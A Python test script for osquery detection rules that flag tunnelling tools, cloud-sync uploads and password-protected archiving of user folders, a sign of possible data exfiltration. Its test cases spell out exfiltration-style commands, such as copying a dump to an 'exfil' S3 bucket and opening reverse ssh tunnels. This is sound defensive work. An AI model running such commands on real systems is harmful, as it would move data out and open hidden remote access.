# Kept in the repo: regenerate and re-test the R37/R38 regexes in a real osquery (osqueryd -S) before editing osquery.conf.
"""R37/R38 command-line patterns, tested in the real osquery (regex_match) before they go into osquery.conf.

Patterns run on lower(cmdline). Each flag is `regex_match(lower(x), P, 0) IS NOT NULL`; the destination is a
COALESCE of capture groups, so the command line itself never needs to be kept.
"""
import json
import subprocess
import sys

E = r'(?:\.exe|\.cmd)?"?'   # an optional Windows extension and the closing quote of a quoted path
P = r'(?:^|[\\/"])'         # the program at the start of its own command line or after a path: not a word in an argument
TUNNEL = [
    P + r"ngrok" + E + r"\s+(?:http|tcp|tls|start|tunnel)\b",
    P + r"cloudflared" + E + r"\s+(?:[^|]*\s)?tunnel\b",
    P + r"code(?:-insiders)?" + E + r"\s+tunnel\b",
    P + r"code-tunnel" + E + r"(?:\s|$)",
    P + r"devtunnel" + E + r"\s+host\b",
    P + r"tailscale" + E + r"\s+funnel\b",
    P + r"ssh" + E + r"\s+(?:[^|]*\s)?-[a-z]*r\s*[0-9]",
    P + r"lt" + E + r"\s+(?:--port|-p)\b",
    P + r"bore" + E + r"\s+local\b",
]
SYNC = [
    P + r"rclone" + E + r"\s+(?:copy|copyto|sync|move|moveto|bisync)\s",
    P + r"restic" + E + r"\s+(?:[^|]*\s)?backup\b",
    P + r"aws" + E + r"\s+s3\s+(?:cp|sync|mv)\s[^|]*s3://",
    P + r"(?:gsutil|gcloud)" + E + r"\s+(?:[^|]*\s)?(?:cp|rsync|mv)\s[^|]*gs://",
    P + r"azcopy" + E + r"\s+(?:copy|cp|sync)\s[^|]*\.blob\.core\.windows\.net",
    P + r"az" + E + r"\s+storage\s+blob\s+(?:upload|upload-batch|sync)\b",
    P + r"(?:mega-put|mega-sync|megaput)\b|" + P + r"megatools\s+(?:put|copy)\b",
    P + r"winscp(?:\.com|\.exe)?\"?\s[^|]*\bput\b",
]
# Exactly one capture group each, so regex_match(x, D, 1) is the destination and nothing else (no credentials).
DEST = [
    P + r"rclone" + E + r"\s+(?:copy|copyto|sync|move|moveto|bisync)\s+[^|]*?\s\"?([a-z0-9_-]{2,}):",
    P + r"restic" + E + r"\s+(?:[^|]*\s)?(?:-r|--repo)[\s=]+\"?(?:[a-z0-9]+:)?/*(?:https?://)?(?:[^@\s\"]*@)?([^\s/:\"]+)",
    r"\bs3://([a-z0-9._-]+)",
    r"\bgs://([a-z0-9._-]+)",
    r"https://([a-z0-9]+)\.blob\.core\.windows\.net",
    r"--account-name[\s=]+\"?([a-z0-9]+)",
    P + r"(mega)-(?:put|sync)\b",
    r"\bopen\s+\"?[a-z]+://(?:[^@\s\"]*@)?([^/\s:\"]+)",
]
ARCHIVE_PW = [
    P + r"7z[a-z]?" + E + r"\s+a\s+(?:[^|]*\s)?-p",
    P + r"(?:win)?rar" + E + r"\s+a\s+(?:[^|]*\s)?-(?:hp|p)",
    P + r"zip\s+(?:[^|]*\s)?(?:-e\b|-p\s|--encrypt|--password)",
]
ARCHIVE_OF = r"[\\/](documents|desktop|pictures|onedrive)\b"

CASES = [  # (command line, tunnel?, sync?, archive?, expected dest or None)
    ("ngrok http 3000", 1, 0, 0, None),
    ('"c:\\tools\\ngrok.exe" tcp 22 --authtoken 2abcSECRET', 1, 0, 0, None),
    ("cloudflared tunnel --url http://localhost:8080", 1, 0, 0, None),
    ("cloudflared --no-autoupdate tunnel run --token eyJSECRET", 1, 0, 0, None),
    ("code tunnel --accept-server-license-terms", 1, 0, 0, None),
    ("devtunnel host -p 3000", 1, 0, 0, None),
    ("tailscale funnel 443 on", 1, 0, 0, None),
    ("ssh -nnt -R 80:localhost:3000 localhost.run", 1, 0, 0, None),
    ("ssh -o batchmode=yes -R 9:localhost:9 test@192.0.2.1", 1, 0, 0, None),
    ("lt --port 8000", 1, 0, 0, None),
    ("bore local 8000 --to bore.pub", 1, 0, 0, None),
    ("rclone copy /home/u/documents drive2:backup", 0, 1, 0, "drive2"),
    ('"c:\\program files\\rclone\\rclone.exe" sync "c:\\users\\<user>\\desktop" gdrive:/desk', 0, 1, 0, "gdrive"),
    ("restic -r rest:https://u:hunter2@example.net/repo backup /home", 0, 1, 0, "example.net"),
    ("restic -r s3:s3.amazonaws.com/bucket-x backup /srv", 0, 1, 0, "s3.amazonaws.com"),
    ("restic backup /home --tag nightly", 0, 1, 0, None),
    ("aws s3 cp ./dump.tar s3://exfil-bucket-1/x", 0, 1, 0, "exfil-bucket-1"),
    ("gsutil -m cp -r . gs://some-bucket", 0, 1, 0, "some-bucket"),
    ("gcloud storage cp a.zip gs://b2", 0, 1, 0, "b2"),
    ("azcopy copy c:\\data https://acct1.blob.core.windows.net/c?sv=SECRET", 0, 1, 0, "acct1"),
    ("az storage blob upload --account-name acct2 -f x -c c", 0, 1, 0, "acct2"),
    ("mega-put file.zip /", 0, 1, 0, "mega"),
    ('winscp.com /command "open sftp://u:pw@example.org/" "put c:\\x\\*" "exit"', 0, 1, 0, "example.org"),
    ("7z a -pS3cret out.7z c:\\users\\<user>\\documents\\*", 0, 0, 1, None),
    ('"c:\\program files\\winrar\\rar.exe" a -hpS3cret x.rar c:\\users\\<user>\\desktop', 0, 0, 1, None),
    ("zip -e -r out.zip /home/u/pictures", 0, 0, 1, None),
    # harmless neighbours: none may fire
    ("ssh user@host", 0, 0, 0, None),
    ("ssh -l root -p 2222 host", 0, 0, 0, None),
    ("scp -r dir host:/tmp", 0, 0, 0, None),
    ("rclone ls gdrive:", 0, 0, 0, None),
    ("rclone config", 0, 0, 0, None),
    ("restic snapshots", 0, 0, 0, None),
    ("aws s3 ls s3://bucket", 0, 0, 0, None),
    ("code --install-extension ms-python.python", 0, 0, 0, None),
    ("tailscale status", 0, 0, 0, None),
    ("cloudflared --version", 0, 0, 0, None),
    ("7z a out.7z folder", 0, 0, 0, None),
    ("7z x -pS3cret in.7z", 0, 0, 0, None),
    ("zip -r out.zip dir", 0, 0, 0, None),
    ("git commit -m 'ngrok http notes'", 0, 0, 0, None),
]


def sql_str(p: str) -> str:
    return "'" + p.replace("'", "''") + "'"


def any_sql(x: str, pats: list[str]) -> str:
    """One regex_match per pattern, OR'ed: osquery caps a regex at 256 bytes."""
    return "(" + " OR ".join(f"(regex_match({x}, {sql_str(p)}, 0) IS NOT NULL)" for p in pats) + ")"


def dest_sql(x: str) -> str:
    return "COALESCE(" + ", ".join(f"regex_match({x}, {sql_str(p)}, 1)" for p in DEST) + ")"


def check() -> int:
    rows = []
    for i, (cl, *_rest) in enumerate(CASES):
        x = sql_str(cl.lower())
        rows.append(f"SELECT {i} AS i, {any_sql(x, TUNNEL)} AS t, {any_sql(x, SYNC)} AS s, "
                    f"{any_sql(x, ARCHIVE_PW)} AS a, {dest_sql(x)} AS d")
    out = subprocess.run(["/opt/osquery/bin/osqueryd", "-S", "--json"], input=" UNION ALL ".join(rows) + ";\n",
                         capture_output=True, text=True, check=False)
    if out.returncode:
        print(out.stderr)
        return 2
    got = {int(r["i"]): r for r in json.loads(out.stdout)}
    bad = 0
    for i, (cl, t, s, a, d) in enumerate(CASES):
        r = got[i]
        res = (int(r["t"]), int(r["s"]), int(r["a"]), r["d"] or None)
        want = (t, s, a, d)
        # the destination only matters when the line is a sync
        if not s:
            res, want = res[:3], want[:3]
        if res != want:
            bad += 1
            print("MISMATCH", cl, "got", res, "want", want)
        for secret in ("secret", "hunter2", "s3cret", "pw@", "sv="):
            if r["d"] and secret in r["d"]:
                bad += 1
                print("SECRET IN DEST", cl, r["d"])
    print(f"{len(CASES) - bad}/{len(CASES)} ok")
    return 1 if bad else 0


if __name__ == "__main__":
    sys.exit(check())
